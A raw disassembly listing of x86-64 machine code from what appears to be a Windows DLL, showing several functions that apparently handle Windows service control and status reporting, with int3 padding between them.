   180003362:	48 83 c4 20          	add    $0x20,%rsp
   180003366:	5f                   	pop    %rdi
   180003367:	c3                   	ret
   180003368:	cc                   	int3
   180003369:	cc                   	int3
   18000336a:	cc                   	int3
   18000336b:	cc                   	int3
   18000336c:	cc                   	int3
   18000336d:	cc                   	int3
   18000336e:	cc                   	int3
   18000336f:	cc                   	int3
   180003370:	40 53                	rex push %rbx
   180003372:	48 83 ec 50          	sub    $0x50,%rsp
   180003376:	48 8b 05 8b cd 03 00 	mov    0x3cd8b(%rip),%rax        # 0x180040108
   18000337d:	48 33 c4             	xor    %rsp,%rax
   180003380:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   180003385:	33 db                	xor    %ebx,%ebx
   180003387:	c7 44 24 20 20 00 00 	movl   $0x20,0x20(%rsp)
   18000338e:	00 
   18000338f:	83 f9 04             	cmp    $0x4,%ecx
   180003392:	89 4c 24 24          	mov    %ecx,0x24(%rsp)
   180003396:	8b c3                	mov    %ebx,%eax
   180003398:	44 8d 53 45          	lea    0x45(%rbx),%r10d
   18000339c:	41 0f 44 c2          	cmove  %r10d,%eax
   1800033a0:	89 44 24 28          	mov    %eax,0x28(%rsp)
   1800033a4:	85 d2                	test   %edx,%edx
   1800033a6:	74 0e                	je     0x1800033b6
   1800033a8:	c7 44 24 2c 2a 04 00 	movl   $0x42a,0x2c(%rsp)
   1800033af:	00 
   1800033b0:	89 54 24 30          	mov    %edx,0x30(%rsp)
   1800033b4:	eb 05                	jmp    0x1800033bb
   1800033b6:	48 89 5c 24 2c       	mov    %rbx,0x2c(%rsp)
   1800033bb:	48 8b 0d 86 ea 03 00 	mov    0x3ea86(%rip),%rcx        # 0x180041e48
   1800033c2:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1800033c7:	44 89 44 24 34       	mov    %r8d,0x34(%rsp)
   1800033cc:	44 89 4c 24 38       	mov    %r9d,0x38(%rsp)
   1800033d1:	48 ff 15 78 78 03 00 	rex.W call *0x37878(%rip)        # 0x18003ac50
   1800033d8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800033dd:	85 c0                	test   %eax,%eax
   1800033df:	75 0e                	jne    0x1800033ef
   1800033e1:	48 ff 15 68 75 03 00 	rex.W call *0x37568(%rip)        # 0x18003a950
   1800033e8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800033ed:	8b d8                	mov    %eax,%ebx
   1800033ef:	8b c3                	mov    %ebx,%eax
   1800033f1:	48 8b 4c 24 40       	mov    0x40(%rsp),%rcx
   1800033f6:	48 33 cc             	xor    %rsp,%rcx
   1800033f9:	e8 f2 58 03 00       	call   0x180038cf0
   1800033fe:	48 83 c4 50          	add    $0x50,%rsp
   180003402:	5b                   	pop    %rbx
   180003403:	c3                   	ret
   180003404:	cc                   	int3
   180003405:	cc                   	int3
   180003406:	cc                   	int3
   180003407:	cc                   	int3
   180003408:	cc                   	int3
   180003409:	cc                   	int3
   18000340a:	cc                   	int3
   18000340b:	cc                   	int3
   18000340c:	48 8b c4             	mov    %rsp,%rax
   18000340f:	48 89 58 08          	mov    %rbx,0x8(%rax)
   180003413:	48 89 68 10          	mov    %rbp,0x10(%rax)
   180003417:	48 89 70 18          	mov    %rsi,0x18(%rax)
   18000341b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   18000341f:	41 56                	push   %r14
   180003421:	48 83 ec 20          	sub    $0x20,%rsp
   180003425:	44 8b f1             	mov    %ecx,%r14d
   180003428:	41 8b f9             	mov    %r9d,%edi
   18000342b:	48 8d 0d 2e ea 03 00 	lea    0x3ea2e(%rip),%rcx        # 0x180041e60
   180003432:	41 8b f0             	mov    %r8d,%esi
   180003435:	8b da                	mov    %edx,%ebx
   180003437:	33 ed                	xor    %ebp,%ebp
   180003439:	48 ff 15 08 7a 03 00 	rex.W call *0x37a08(%rip)        # 0x18003ae48
   180003440:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003445:	44 39 35 3c ea 03 00 	cmp    %r14d,0x3ea3c(%rip)        # 0x180041e88
   18000344c:	75 1f                	jne    0x18000346d
   18000344e:	8b 05 38 ea 03 00    	mov    0x3ea38(%rip),%eax        # 0x180041e8c
   180003454:	85 c0                	test   %eax,%eax
   180003456:	0f 45 d8             	cmovne %eax,%ebx
   180003459:	3b c3                	cmp    %ebx,%eax
   18000345b:	75 10                	jne    0x18000346d
   18000345d:	39 35 2d ea 03 00    	cmp    %esi,0x3ea2d(%rip)        # 0x180041e90
   180003463:	75 08                	jne    0x18000346d
   180003465:	39 3d 29 ea 03 00    	cmp    %edi,0x3ea29(%rip)        # 0x180041e94
   18000346b:	74 2f                	je     0x18000349c
   18000346d:	44 8b cf             	mov    %edi,%r9d
   180003470:	44 8b c6             	mov    %esi,%r8d
   180003473:	8b d3                	mov    %ebx,%edx
   180003475:	41 8b ce             	mov    %r14d,%ecx
   180003478:	e8 f3 fe ff ff       	call   0x180003370
   18000347d:	8b e8                	mov    %eax,%ebp
   18000347f:	85 c0                	test   %eax,%eax
   180003481:	75 19                	jne    0x18000349c
   180003483:	44 89 35 fe e9 03 00 	mov    %r14d,0x3e9fe(%rip)        # 0x180041e88
   18000348a:	89 1d fc e9 03 00    	mov    %ebx,0x3e9fc(%rip)        # 0x180041e8c
   180003490:	89 35 fa e9 03 00    	mov    %esi,0x3e9fa(%rip)        # 0x180041e90
   180003496:	89 3d f8 e9 03 00    	mov    %edi,0x3e9f8(%rip)        # 0x180041e94
   18000349c:	48 8d 0d bd e9 03 00 	lea    0x3e9bd(%rip),%rcx        # 0x180041e60
   1800034a3:	48 ff 15 7e 79 03 00 	rex.W call *0x3797e(%rip)        # 0x18003ae28
   1800034aa:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800034af:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800034b4:	8b c5                	mov    %ebp,%eax
   1800034b6:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800034bb:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800034c0:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   1800034c5:	48 83 c4 20          	add    $0x20,%rsp
   1800034c9:	41 5e                	pop    %r14
   1800034cb:	c3                   	ret
   1800034cc:	cc                   	int3
   1800034cd:	cc                   	int3
   1800034ce:	cc                   	int3
   1800034cf:	cc                   	int3
   1800034d0:	cc                   	int3
   1800034d1:	cc                   	int3
   1800034d2:	cc                   	int3
   1800034d3:	cc                   	int3
   1800034d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800034d9:	57                   	push   %rdi
   1800034da:	48 83 ec 20          	sub    $0x20,%rsp
   1800034de:	8b f9                	mov    %ecx,%edi
   1800034e0:	33 db                	xor    %ebx,%ebx
   1800034e2:	48 8d 0d b7 e8 03 00 	lea    0x3e8b7(%rip),%rcx        # 0x180041da0
   1800034e9:	48 ff 15 58 79 03 00 	rex.W call *0x37958(%rip)        # 0x18003ae48
   1800034f0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800034f5:	8b 05 05 e9 03 00    	mov    0x3e905(%rip),%eax        # 0x180041e00
   1800034fb:	85 c0                	test   %eax,%eax
   1800034fd:	75 0c                	jne    0x18000350b
   1800034ff:	c7 05 f7 e8 03 00 01 	movl   $0x1,0x3e8f7(%rip)        # 0x180041e00
   180003506:	00 00 00 
   180003509:	eb 05                	jmp    0x180003510
   18000350b:	bb 01 00 00 00       	mov    $0x1,%ebx
   180003510:	48 8d 0d 89 e8 03 00 	lea    0x3e889(%rip),%rcx        # 0x180041da0
   180003517:	48 ff 15 0a 79 03 00 	rex.W call *0x3790a(%rip)        # 0x18003ae28
   18000351e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003523:	83 fb 01             	cmp    $0x1,%ebx
   180003526:	74 58                	je     0x180003580
   180003528:	48 8b 0d 79 e9 03 00 	mov    0x3e979(%rip),%rcx        # 0x180041ea8
   18000352f:	48 8d 05 fa 04 00 00 	lea    0x4fa(%rip),%rax        # 0x180003a30
   180003536:	0f 57 c0             	xorps  %xmm0,%xmm0
   180003539:	48 89 05 e0 e8 03 00 	mov    %rax,0x3e8e0(%rip)        # 0x180041e20
   180003540:	0f 57 c9             	xorps  %xmm1,%xmm1
   180003543:	4c 8d 0d de e8 03 00 	lea    0x3e8de(%rip),%r9        # 0x180041e28
   18000354a:	f3 0f 7f 05 d6 e8 03 	movdqu %xmm0,0x3e8d6(%rip)        # 0x180041e28
   180003551:	00 
   180003552:	4c 8b c7             	mov    %rdi,%r8
   180003555:	33 d2                	xor    %edx,%edx
   180003557:	f3 0f 7f 0d d9 e8 03 	movdqu %xmm1,0x3e8d9(%rip)        # 0x180041e38
   18000355e:	00 
   18000355f:	48 8b 49 38          	mov    0x38(%rcx),%rcx
   180003563:	48 ff 15 a6 74 03 00 	rex.W call *0x374a6(%rip)        # 0x18003aa10
   18000356a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000356f:	83 f8 01             	cmp    $0x1,%eax
   180003572:	74 0c                	je     0x180003580
   180003574:	48 ff 15 d5 73 03 00 	rex.W call *0x373d5(%rip)        # 0x18003a950
   18000357b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003580:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   180003585:	48 83 c4 20          	add    $0x20,%rsp
   180003589:	5f                   	pop    %rdi
   18000358a:	c3                   	ret
   18000358b:	cc                   	int3
   18000358c:	cc                   	int3
   18000358d:	cc                   	int3
   18000358e:	cc                   	int3
   18000358f:	cc                   	int3
   180003590:	cc                   	int3
   180003591:	cc                   	int3
   180003592:	cc                   	int3
   180003593:	cc                   	int3
   180003594:	cc                   	int3
   180003595:	cc                   	int3
   180003596:	cc                   	int3
   180003597:	cc                   	int3
   180003598:	cc                   	int3
   180003599:	cc                   	int3
   18000359a:	cc                   	int3
   18000359b:	cc                   	int3
   18000359c:	cc                   	int3
   18000359d:	cc                   	int3
   18000359e:	cc                   	int3
   18000359f:	cc                   	int3
   1800035a0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800035a5:	57                   	push   %rdi
   1800035a6:	48 83 ec 20          	sub    $0x20,%rsp
   1800035aa:	33 db                	xor    %ebx,%ebx
   1800035ac:	83 e9 01             	sub    $0x1,%ecx
   1800035af:	0f 84 f0 00 00 00    	je     0x1800036a5
   1800035b5:	83 e9 03             	sub    $0x3,%ecx
   1800035b8:	74 13                	je     0x1800035cd
   1800035ba:	83 e9 01             	sub    $0x1,%ecx
   1800035bd:	0f 84 d6 00 00 00    	je     0x180003699
   1800035c3:	83 f9 08             	cmp    $0x8,%ecx
   1800035c6:	74 5d                	je     0x180003625
   1800035c8:	bb 78 00 00 00       	mov    $0x78,%ebx
   1800035cd:	8b 05 31 e8 03 00    	mov    0x3e831(%rip),%eax        # 0x180041e04
   1800035d3:	85 c0                	test   %eax,%eax
   1800035d5:	0f 85 ef 00 00 00    	jne    0x1800036ca
   1800035db:	48 8d 0d 7e e8 03 00 	lea    0x3e87e(%rip),%rcx        # 0x180041e60
   1800035e2:	48 ff 15 5f 78 03 00 	rex.W call *0x3785f(%rip)        # 0x18003ae48
   1800035e9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800035ee:	44 8b 0d 9f e8 03 00 	mov    0x3e89f(%rip),%r9d        # 0x180041e94
   1800035f5:	44 8b 05 94 e8 03 00 	mov    0x3e894(%rip),%r8d        # 0x180041e90
   1800035fc:	8b 15 8a e8 03 00    	mov    0x3e88a(%rip),%edx        # 0x180041e8c
   180003602:	8b 0d 80 e8 03 00    	mov    0x3e880(%rip),%ecx        # 0x180041e88
   180003608:	e8 63 fd ff ff       	call   0x180003370
   18000360d:	48 8d 0d 4c e8 03 00 	lea    0x3e84c(%rip),%rcx        # 0x180041e60
   180003614:	48 ff 15 0d 78 03 00 	rex.W call *0x3780d(%rip)        # 0x18003ae28
   18000361b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003620:	e9 a5 00 00 00       	jmp    0x1800036ca
   180003625:	83 fa 04             	cmp    $0x4,%edx
   180003628:	74 21                	je     0x18000364b
   18000362a:	83 fa 07             	cmp    $0x7,%edx
   18000362d:	74 05                	je     0x180003634
   18000362f:	83 fa 12             	cmp    $0x12,%edx
   180003632:	75 99                	jne    0x1800035cd
   180003634:	e8 9f a0 00 00       	call   0x18000d6d8
   180003639:	8b d8                	mov    %eax,%ebx
   18000363b:	85 c0                	test   %eax,%eax
   18000363d:	74 8e                	je     0x1800035cd
   18000363f:	bf 2f 00 00 40       	mov    $0x4000002f,%edi
   180003644:	ba 0e 03 00 00       	mov    $0x30e,%edx
   180003649:	eb 64                	jmp    0x1800036af
   18000364b:	48 8d 0d 4e e7 03 00 	lea    0x3e74e(%rip),%rcx        # 0x180041da0
   180003652:	48 ff 15 ef 77 03 00 	rex.W call *0x377ef(%rip)        # 0x18003ae48
   180003659:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000365e:	48 8b 0d a3 e7 03 00 	mov    0x3e7a3(%rip),%rcx        # 0x180041e08
   180003665:	48 ff 15 54 75 03 00 	rex.W call *0x37554(%rip)        # 0x18003abc0
   18000366c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003671:	ff 05 99 e7 03 00    	incl   0x3e799(%rip)        # 0x180041e10
   180003677:	48 8d 0d 22 e7 03 00 	lea    0x3e722(%rip),%rcx        # 0x180041da0
   18000367e:	c7 05 7c e7 03 00 01 	movl   $0x1,0x3e77c(%rip)        # 0x180041e04
   180003685:	00 00 00 
   180003688:	48 ff 15 99 77 03 00 	rex.W call *0x37799(%rip)        # 0x18003ae28
   18000368f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003694:	e9 34 ff ff ff       	jmp    0x1800035cd
   180003699:	bf eb 02 00 c0       	mov    $0xc00002eb,%edi
   18000369e:	ba 81 02 00 00       	mov    $0x281,%edx
   1800036a3:	eb 0a                	jmp    0x1800036af
   1800036a5:	bf 87 02 00 c0       	mov    $0xc0000287,%edi
   1800036aa:	ba 8c 04 00 00       	mov    $0x48c,%edx
   1800036af:	b9 03 00 00 00       	mov    $0x3,%ecx
   1800036b4:	41 b9 d0 07 00 00    	mov    $0x7d0,%r9d
   1800036ba:	44 8d 41 fe          	lea    -0x2(%rcx),%r8d
   1800036be:	e8 49 fd ff ff       	call   0x18000340c
   1800036c3:	8b cf                	mov    %edi,%ecx
   1800036c5:	e8 0a fe ff ff       	call   0x1800034d4
   1800036ca:	8b c3                	mov    %ebx,%eax
   1800036cc:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800036d1:	48 83 c4 20          	add    $0x20,%rsp
   1800036d5:	5f                   	pop    %rdi
   1800036d6:	c3                   	ret
   1800036d7:	cc                   	int3
   1800036d8:	cc                   	int3
   1800036d9:	cc                   	int3
   1800036da:	cc                   	int3
   1800036db:	cc                   	int3
   1800036dc:	cc                   	int3
   1800036dd:	cc                   	int3
   1800036de:	cc                   	int3
   1800036df:	cc                   	int3
   1800036e0:	40 53                	rex push %rbx
   1800036e2:	48 83 ec 20          	sub    $0x20,%rsp
   1800036e6:	e8 15 f4 ff ff       	call   0x180002b00
   1800036eb:	8b d8                	mov    %eax,%ebx
   1800036ed:	85 c0                	test   %eax,%eax
   1800036ef:	0f 85 bf 01 00 00    	jne    0x1800038b4
   1800036f5:	45 33 c0             	xor    %r8d,%r8d
   1800036f8:	48 8d 0d 31 ca 03 00 	lea    0x3ca31(%rip),%rcx        # 0x180040130
   1800036ff:	ba 01 19 0c 00       	mov    $0xc1901,%edx
   180003704:	48 ff 15 d5 76 03 00 	rex.W call *0x376d5(%rip)        # 0x18003ade0
   18000370b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003710:	21 1d 32 d3 03 00    	and    %ebx,0x3d332(%rip)        # 0x180040a48
   180003716:	48 89 05 3b d3 03 00 	mov    %rax,0x3d33b(%rip)        # 0x180040a58
   18000371d:	c7 05 29 d3 03 00 01 	movl   $0x1,0x3d329(%rip)        # 0x180040a50
   180003724:	00 00 00 
   180003727:	48 8d 0d f2 dd 03 00 	lea    0x3ddf2(%rip),%rcx        # 0x180041520
   18000372e:	48 ff 15 2b 77 03 00 	rex.W call *0x3772b(%rip)        # 0x18003ae60
   180003735:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000373a:	85 c0                	test   %eax,%eax
   18000373c:	74 0a                	je     0x180003748
   18000373e:	bb 08 00 00 00       	mov    $0x8,%ebx
   180003743:	e9 6c 01 00 00       	jmp    0x1800038b4
   180003748:	48 8d 05 01 de 03 00 	lea    0x3de01(%rip),%rax        # 0x180041550
   18000374f:	c7 05 1b d1 03 00 01 	movl   $0x1,0x3d11b(%rip)        # 0x180040874
   180003756:	00 00 00 
   180003759:	48 8d 0d a8 7f 03 00 	lea    0x37fa8(%rip),%rcx        # 0x18003b708
   180003760:	48 89 05 f1 dd 03 00 	mov    %rax,0x3ddf1(%rip)        # 0x180041558
   180003767:	48 89 05 e2 dd 03 00 	mov    %rax,0x3dde2(%rip)        # 0x180041550
   18000376e:	33 db                	xor    %ebx,%ebx
   180003770:	48 ff 15 e9 72 03 00 	rex.W call *0x372e9(%rip)        # 0x18003aa60
   180003777:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000377c:	48 89 05 fd d0 03 00 	mov    %rax,0x3d0fd(%rip)        # 0x180040880
   180003783:	48 85 c0             	test   %rax,%rax
   180003786:	75 10                	jne    0x180003798
   180003788:	48 ff 15 c1 71 03 00 	rex.W call *0x371c1(%rip)        # 0x18003a950
   18000378f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003794:	8b d8                	mov    %eax,%ebx
   180003796:	eb 4b                	jmp    0x1800037e3
   180003798:	48 8d 15 79 7f 03 00 	lea    0x37f79(%rip),%rdx        # 0x18003b718
   18000379f:	48 8b c8             	mov    %rax,%rcx
   1800037a2:	48 ff 15 9f 72 03 00 	rex.W call *0x3729f(%rip)        # 0x18003aa48
   1800037a9:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800037ae:	48 89 05 c3 d0 03 00 	mov    %rax,0x3d0c3(%rip)        # 0x180040878
   1800037b5:	48 85 c0             	test   %rax,%rax
   1800037b8:	75 29                	jne    0x1800037e3
   1800037ba:	48 ff 15 8f 71 03 00 	rex.W call *0x3718f(%rip)        # 0x18003a950
   1800037c1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800037c6:	48 8b 0d b3 d0 03 00 	mov    0x3d0b3(%rip),%rcx        # 0x180040880
   1800037cd:	8b d8                	mov    %eax,%ebx
   1800037cf:	48 ff 15 62 72 03 00 	rex.W call *0x37262(%rip)        # 0x18003aa38
   1800037d6:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800037db:	48 83 25 9d d0 03 00 	andq   $0x0,0x3d09d(%rip)        # 0x180040880
   1800037e2:	00 
   1800037e3:	85 db                	test   %ebx,%ebx
   1800037e5:	0f 85 c9 00 00 00    	jne    0x1800038b4
   1800037eb:	e8 bc e0 ff ff       	call   0x1800018ac
   1800037f0:	8b d8                	mov    %eax,%ebx
   1800037f2:	85 c0                	test   %eax,%eax
   1800037f4:	0f 85 ba 00 00 00    	jne    0x1800038b4
   1800037fa:	48 8d 0d 8f d0 03 00 	lea    0x3d08f(%rip),%rcx        # 0x180040890
   180003801:	48 ff 15 58 76 03 00 	rex.W call *0x37658(%rip)        # 0x18003ae60
   180003808:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   18000380d:	85 c0                	test   %eax,%eax
   18000380f:	0f 85 29 ff ff ff    	jne    0x18000373e
   180003815:	c7 05 69 d0 03 00 01 	movl   $0x1,0x3d069(%rip)        # 0x180040888
   18000381c:	00 00 00 
   18000381f:	e8 48 04 02 00       	call   0x180023c6c
   180003824:	8b d8                	mov    %eax,%ebx
   180003826:	85 c0                	test   %eax,%eax
   180003828:	0f 85 86 00 00 00    	jne    0x1800038b4
   18000382e:	e8 09 87 02 00       	call   0x18002bf3c
   180003833:	8b d8                	mov    %eax,%ebx
   180003835:	85 c0                	test   %eax,%eax
   180003837:	75 7b                	jne    0x1800038b4
   180003839:	38 05 2e d2 03 00    	cmp    %al,0x3d22e(%rip)        # 0x180040a6d
   18000383f:	74 6e                	je     0x1800038af
   180003841:	38 05 25 d2 03 00    	cmp    %al,0x3d225(%rip)        # 0x180040a6c
   180003847:	75 5d                	jne    0x1800038a6
   180003849:	48 83 25 d7 db 03 00 	andq   $0x0,0x3dbd7(%rip)        # 0x180041428
   180003850:	00 
   180003851:	48 8d 05 d8 db 03 00 	lea    0x3dbd8(%rip),%rax        # 0x180041430
   180003858:	21 1d e2 db 03 00    	and    %ebx,0x3dbe2(%rip)        # 0x180041440
   18000385e:	8d 53 01             	lea    0x1(%rbx),%edx
   180003861:	48 83 25 07 d2 03 00 	andq   $0x0,0x3d207(%rip)        # 0x180040a70
   180003868:	00 
   180003869:	45 33 c9             	xor    %r9d,%r9d
   18000386c:	48 83 25 d4 db 03 00 	andq   $0x0,0x3dbd4(%rip)        # 0x180041448
   180003873:	00 
   180003874:	45 33 c0             	xor    %r8d,%r8d
   180003877:	33 c9                	xor    %ecx,%ecx
   180003879:	48 89 05 b8 db 03 00 	mov    %rax,0x3dbb8(%rip)        # 0x180041438
   180003880:	48 89 05 a9 db 03 00 	mov    %rax,0x3dba9(%rip)        # 0x180041430
   180003887:	48 ff 15 12 73 03 00 	rex.W call *0x37312(%rip)        # 0x18003aba0
   18000388e:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003893:	48 89 05 d6 d1 03 00 	mov    %rax,0x3d1d6(%rip)        # 0x180040a70
   18000389a:	48 85 c0             	test   %rax,%rax
   18000389d:	74 10                	je     0x1800038af
   18000389f:	c6 05 c6 d1 03 00 01 	movb   $0x1,0x3d1c6(%rip)        # 0x180040a6c
   1800038a6:	e8 91 4c 02 00       	call   0x18002853c
   1800038ab:	8b d8                	mov    %eax,%ebx
   1800038ad:	eb 05                	jmp    0x1800038b4
   1800038af:	bb 4f 05 00 00       	mov    $0x54f,%ebx
   1800038b4:	8b c3                	mov    %ebx,%eax
   1800038b6:	48 83 c4 20          	add    $0x20,%rsp
   1800038ba:	5b                   	pop    %rbx
   1800038bb:	c3                   	ret
   1800038bc:	cc                   	int3
   1800038bd:	cc                   	int3
   1800038be:	cc                   	int3
   1800038bf:	cc                   	int3
   1800038c0:	cc                   	int3
   1800038c1:	cc                   	int3
   1800038c2:	cc                   	int3
   1800038c3:	cc                   	int3
   1800038c4:	40 53                	rex push %rbx
   1800038c6:	48 83 ec 20          	sub    $0x20,%rsp
   1800038ca:	33 db                	xor    %ebx,%ebx
   1800038cc:	83 3d c5 d1 03 00 01 	cmpl   $0x1,0x3d1c5(%rip)        # 0x180040a98
   1800038d3:	75 12                	jne    0x1800038e7
   1800038d5:	48 ff 15 f4 6f 03 00 	rex.W call *0x36ff4(%rip)        # 0x18003a8d0
   1800038dc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800038e1:	89 1d b1 d1 03 00    	mov    %ebx,0x3d1b1(%rip)        # 0x180040a98
   1800038e7:	38 1d 7f d1 03 00    	cmp    %bl,0x3d17f(%rip)        # 0x180040a6c
   1800038ed:	74 2f                	je     0x18000391e
   1800038ef:	b9 20 01 00 c0       	mov    $0xc0000120,%ecx
   1800038f4:	e8 ef a4 01 00       	call   0x18001dde8
   1800038f9:	48 8b 0d 70 d1 03 00 	mov    0x3d170(%rip),%rcx        # 0x180040a70
   180003900:	48 85 c9             	test   %rcx,%rcx
   180003903:	74 13                	je     0x180003918
   180003905:	48 ff 15 84 70 03 00 	rex.W call *0x37084(%rip)        # 0x18003a990
   18000390c:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003911:	48 89 1d 58 d1 03 00 	mov    %rbx,0x3d158(%rip)        # 0x180040a70
   180003918:	88 1d 4e d1 03 00    	mov    %bl,0x3d14e(%rip)        # 0x180040a6c
   18000391e:	83 3d 77 d1 03 00 01 	cmpl   $0x1,0x3d177(%rip)        # 0x180040a9c
   180003925:	75 0b                	jne    0x180003932
   180003927:	e8 cc b3 02 00       	call   0x18002ecf8
   18000392c:	89 1d 6a d1 03 00    	mov    %ebx,0x3d16a(%rip)        # 0x180040a9c
   180003932:	e8 2d 06 02 00       	call   0x180023f64
   180003937:	39 1d 4b cf 03 00    	cmp    %ebx,0x3cf4b(%rip)        # 0x180040888
   18000393d:	74 19                	je     0x180003958
   18000393f:	48 8d 0d 4a cf 03 00 	lea    0x3cf4a(%rip),%rcx        # 0x180040890
   180003946:	48 ff 15 03 75 03 00 	rex.W call *0x37503(%rip)        # 0x18003ae50
   18000394d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003952:	89 1d 30 cf 03 00    	mov    %ebx,0x3cf30(%rip)        # 0x180040888
   180003958:	e8 a3 dc ff ff       	call   0x180001600
   18000395d:	48 8b 0d 1c cf 03 00 	mov    0x3cf1c(%rip),%rcx        # 0x180040880
   180003964:	48 85 c9             	test   %rcx,%rcx
   180003967:	74 1a                	je     0x180003983
   180003969:	48 ff 15 c8 70 03 00 	rex.W call *0x370c8(%rip)        # 0x18003aa38
   180003970:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003975:	48 89 1d 04 cf 03 00 	mov    %rbx,0x3cf04(%rip)        # 0x180040880
   18000397c:	48 89 1d f5 ce 03 00 	mov    %rbx,0x3cef5(%rip)        # 0x180040878
   180003983:	39 1d eb ce 03 00    	cmp    %ebx,0x3ceeb(%rip)        # 0x180040874
   180003989:	74 20                	je     0x1800039ab
   18000398b:	33 c9                	xor    %ecx,%ecx
   18000398d:	e8 8e e8 00 00       	call   0x180012220
   180003992:	48 8d 0d 87 db 03 00 	lea    0x3db87(%rip),%rcx        # 0x180041520
   180003999:	48 ff 15 b0 74 03 00 	rex.W call *0x374b0(%rip)        # 0x18003ae50
   1800039a0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800039a5:	89 1d c9 ce 03 00    	mov    %ebx,0x3cec9(%rip)        # 0x180040874
   1800039ab:	39 1d 9f d0 03 00    	cmp    %ebx,0x3d09f(%rip)        # 0x180040a50
   1800039b1:	74 3f                	je     0x1800039f2
   1800039b3:	44 8b 05 8e d0 03 00 	mov    0x3d08e(%rip),%r8d        # 0x180040a48
   1800039ba:	ba 80 02 00 00       	mov    $0x280,%edx
   1800039bf:	48 8b 0d 92 d0 03 00 	mov    0x3d092(%rip),%rcx        # 0x180040a58
   1800039c6:	48 ff 15 0b 74 03 00 	rex.W call *0x3740b(%rip)        # 0x18003add8
   1800039cd:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800039d2:	48 8b 0d 7f d0 03 00 	mov    0x3d07f(%rip),%rcx        # 0x180040a58
   1800039d9:	48 ff 15 18 74 03 00 	rex.W call *0x37418(%rip)        # 0x18003adf8
   1800039e0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1800039e5:	48 89 1d 6c d0 03 00 	mov    %rbx,0x3d06c(%rip)        # 0x180040a58
   1800039ec:	89 1d 5e d0 03 00    	mov    %ebx,0x3d05e(%rip)        # 0x180040a50
   1800039f2:	83 3d 5b ce 03 00 01 	cmpl   $0x1,0x3ce5b(%rip)        # 0x180040854
   1800039f9:	75 19                	jne    0x180003a14
   1800039fb:	48 8d 0d de e4 03 00 	lea    0x3e4de(%rip),%rcx        # 0x180041ee0
   180003a02:	48 ff 15 47 74 03 00 	rex.W call *0x37447(%rip)        # 0x18003ae50
   180003a09:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003a0e:	89 1d 40 ce 03 00    	mov    %ebx,0x3ce40(%rip)        # 0x180040854
   180003a14:	48 83 c4 20          	add    $0x20,%rsp
   180003a18:	5b                   	pop    %rbx
   180003a19:	c3                   	ret
   180003a1a:	cc                   	int3
   180003a1b:	cc                   	int3
   180003a1c:	cc                   	int3
   180003a1d:	cc                   	int3
   180003a1e:	cc                   	int3
   180003a1f:	cc                   	int3
   180003a20:	cc                   	int3
   180003a21:	cc                   	int3
   180003a22:	cc                   	int3
   180003a23:	cc                   	int3
   180003a24:	cc                   	int3
   180003a25:	cc                   	int3
   180003a26:	cc                   	int3
   180003a27:	cc                   	int3
   180003a28:	cc                   	int3
   180003a29:	cc                   	int3
   180003a2a:	cc                   	int3
   180003a2b:	cc                   	int3
   180003a2c:	cc                   	int3
   180003a2d:	cc                   	int3
   180003a2e:	cc                   	int3
   180003a2f:	cc                   	int3
   180003a30:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180003a35:	56                   	push   %rsi
   180003a36:	48 83 ec 20          	sub    $0x20,%rsp
   180003a3a:	33 d2                	xor    %edx,%edx
   180003a3c:	49 8b d8             	mov    %r8,%rbx
   180003a3f:	41 b9 e8 03 00 00    	mov    $0x3e8,%r9d
   180003a45:	45 33 c0             	xor    %r8d,%r8d
   180003a48:	8d 4a 03             	lea    0x3(%rdx),%ecx
   180003a4b:	e8 bc f9 ff ff       	call   0x18000340c
   180003a50:	48 8d 35 49 e3 03 00 	lea    0x3e349(%rip),%rsi        # 0x180041da0
   180003a57:	48 8b ce             	mov    %rsi,%rcx
   180003a5a:	48 ff 15 e7 73 03 00 	rex.W call *0x373e7(%rip)        # 0x18003ae48
   180003a61:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   180003a66:	48 8b ce             	mov    %rsi,%rcx
